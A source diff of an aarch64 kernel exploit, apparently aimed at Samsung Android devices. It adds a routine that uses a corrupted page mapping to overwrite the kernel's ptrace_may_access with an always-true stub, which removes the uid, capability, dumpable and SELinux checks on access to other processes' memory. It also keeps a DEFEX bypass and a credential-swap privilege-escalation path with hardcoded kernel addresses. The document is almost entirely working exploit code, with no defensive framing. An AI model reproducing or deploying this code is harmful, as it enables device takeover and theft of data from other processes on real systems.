@@ -193,6 +193,7 @@ static void flush_tlb(void) {
 */
 #define INIT_TASK_PA          0x41f4d2c0UL
 #define DEFEX_ENFORCE_PA      0x40270330UL
+#define PTRACE_MAY_ACCESS_PA  0x40183874UL
 #define TS_TASKS_OFF          0x550
 #define TS_PID_OFF            0x618
 #define TS_PARENT_OFF         0x630
@@ -201,12 +202,14 @@ static void flush_tlb(void) {
 #define LINEAR_OFFSET         0xffffff7fc0000000UL
 #define LINEAR_VA_TO_PA(v)    ((v) - LINEAR_OFFSET)
 
-/* aarch64 "mov w0, wzr ; ret" — i.e., return 0 unconditionally. The
-   original task_defex_enforce starts with paciasp, but it's only ever
-   reached via direct `bl` (no callers store its address as data), so we
-   don't need a BTI landing pad — and since the stub never touches LR, we
-   don't need PAC either. */
+/* aarch64 "mov w0, wzr ; ret" — return 0 unconditionally (used by the
+   defex bypass below). "mov w0, #1 ; ret" is the same shape but returns
+   true (used to neuter ptrace_may_access, which returns bool). Neither
+   target needs a BTI landing pad: both are reached via direct `bl` only
+   (no callers store their address as data), and our stubs don't touch
+   LR so PAC isn't needed either. */
 #define INSN_MOV_W0_0         0x52800000U
+#define INSN_MOV_W0_1         0x52800020U
 #define INSN_RET              0xd65f03c0U
 
 static volatile uint8_t *KMAP;        /* set to glitched_map before any kread/kwrite */
@@ -265,6 +268,70 @@ static void disable_defex(void) {
     __asm__ volatile("dsb ish; isb" ::: "memory");
 }
 
+/* Patch ptrace_may_access to "mov w0, #1 ; ret" so it always allows.
+   Bypasses uid match, CAP_SYS_PTRACE check, dumpable check, and the
+   SELinux ptrace hook in one swoop. Reading another process's
+   /proc/<pid>/maps and pwritev'ing to /proc/<pid>/mem (or via
+   process_vm_writev / preadv with iovec offsets, which call the same
+   mm_access path) all unblock. uid stays the same so DEFEX PED never
+   fires — no defex bypass needed. */
+static void patch_ptrace_may_access(void) {
+    p_str("[*] patching ptrace_may_access -> mov w0, #1 ; ret\n");
+    uint64_t pa      = PTRACE_MAY_ACCESS_PA;
+    uint64_t page_pa = pa & ~0xfffUL;
+    size_t   off     = pa & 0xfff;
+
+    kpoint(page_pa);
+    *(volatile uint32_t *)(KMAP + off + 0) = INSN_MOV_W0_1;
+    *(volatile uint32_t *)(KMAP + off + 4) = INSN_RET;
+    __asm__ volatile("dsb ish" ::: "memory");
+
+    uintptr_t va_start = (uintptr_t)(KMAP + off);
+    uintptr_t va_end   = va_start + 8;
+    uintptr_t line     = va_start & ~63UL;
+    for (uintptr_t a = line; a < va_end; a += 64)
+        __asm__ volatile("dc cvau, %0" :: "r"(a) : "memory");
+    __asm__ volatile("dsb ish" ::: "memory");
+    for (uintptr_t a = line; a < va_end; a += 64)
+        __asm__ volatile("ic ivau, %0" :: "r"(a) : "memory");
+    __asm__ volatile("dsb ish; isb" ::: "memory");
+}
+
+/* Block forever via nanosleep so the patch stays installed and the
+   exploit process is still around to be inspected. Loop in case
+   nanosleep returns early on a signal. Inlined raw svc to avoid pulling
+   in any extra LSS dependency. */
+static void sleep_forever(void) {
+    struct { long tv_sec; long tv_nsec; } ts;
+    ts.tv_sec  = 3600;
+    ts.tv_nsec = 0;
+    for (;;) {
+        register long x8 __asm__("x8") = 101;          /* __NR_nanosleep */
+        register long x0 __asm__("x0") = (long)(uintptr_t)&ts;
+        register long x1 __asm__("x1") = 0;
+        __asm__ volatile("svc #0"
+                         : "+r"(x0)
+                         : "r"(x8), "r"(x1)
+                         : "memory", "cc");
+    }
+}
+
+static void do_ptrace_patch_only(uint64_t orig_pte, uint8_t *glitched_map) {
+    KMAP      = glitched_map;
+    KORIG_PTE = orig_pte;
+
+    patch_ptrace_may_access();
+
+    /* restore the original PTE — the glitched mapping is no longer needed. */
+    *glitched_pte = orig_pte;
+
+    p_str("[+] patched. process pid=");
+    p_hex(sys_getpid(), 8);
+    p_str(", sleeping forever.\n");
+    sleep_forever();
+}
+
+__attribute__((unused))
 static void do_lpe(uint64_t orig_pte, uint8_t *glitched_map) {
     KMAP      = glitched_map;
     KORIG_PTE = orig_pte;
@@ -431,6 +498,9 @@ void _start(void) {
     p_hex64((uint64_t)(uintptr_t)glitched_map);
     p_nl();
 
-    do_lpe(orig_pte, glitched_map);
+    /* Cred-swap LPE path is left below for reference but disabled for
+       now — we only land the ptrace_may_access patch and stay alive. */
+    do_ptrace_patch_only(orig_pte, glitched_map);
+    /* do_lpe(orig_pte, glitched_map); */
     __builtin_unreachable();
 }
